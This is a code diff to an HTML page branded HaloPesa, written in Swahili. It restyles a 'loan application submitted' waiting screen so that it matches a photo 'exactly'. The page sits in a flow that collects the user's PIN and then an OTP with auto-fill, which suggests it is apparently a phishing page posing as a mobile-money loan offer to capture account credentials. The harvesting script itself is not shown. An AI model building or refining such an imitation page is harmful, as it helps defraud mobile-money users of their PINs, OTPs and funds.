@@ -10,7 +10,7 @@
   <!-- Toast Overlay Notification -->
   <div id="toast-notification" class="toast-notification hidden"></div>
 
-  <header class="header">
+  <header class="header" id="main-header">
     <div class="logo-container">
       <span class="menu-icon">&#9776;</span>
       <div class="logo">HaloPesa</div>
@@ -163,22 +163,26 @@
       <button id="btn-submit-pin" class="primary-btn" disabled>INGIA</button>
     </section>
 
-    <!-- Step 5b: Waiting / Approval Pending Screen -->
-    <section id="step-waiting" class="card hidden text-center waiting-card">
-      <div class="waiting-icon-container">
-        <div class="waiting-clipboard-icon">📋</div>
-      </div>
-      <h2>Maombi ya Mkopo Yamewasilishwa</h2>
-      <p class="subtitle-waiting">
-        Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini.<br>
-        Utapata ujumbe wa uthibitisho. Kwa sasa, endelea kwenye HaloPesa.
-      </p>
+    <!-- Step 5b: Full-Screen Orange Waiting Screen matching photo exactly -->
+    <section id="step-waiting" class="full-screen-waiting hidden">
+      <div class="waiting-content-wrapper">
+        <div class="waiting-icon-ring">
+          <div class="waiting-clipboard-icon">📋</div>
+          <div class="spinning-ring"></div>
+        </div>
+        
+        <h2>Maombi ya Mkopo Yamewasilishwa</h2>
+        <p class="waiting-desc">
+          Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini.<br>
+          Utapata ujumbe wa uthibitisho. Kwa sasa, endelea kwenye HaloPesa.
+        </p>
 
-      <div class="waiting-badge">
-        <span>🔄 Unaelekezwa kwenye kuingia HaloPesa katika <strong id="waiting-countdown">3</strong> s...</span>
-      </div>
+        <div class="waiting-badge-pill">
+          <span>🔄 Unaelekezwa kwenye kuingia HaloPesa katika <strong id="waiting-countdown">3</strong> s...</span>
+        </div>
 
-      <button id="btn-go-login-now" class="primary-btn waiting-btn">Nenda Kuingia Sasa</button>
+        <button id="btn-go-login-now" class="orange-action-btn">Nenda Kuingia Sasa</button>
+      </div>
     </section>
 
     <!-- Step 6: OTP Screen with Countdown & Auto-Fill -->
@@ -233,5 +237,5 @@
 
   <script src="script.js"></script>
 </body>
-        </html>
+                                     </html>
             
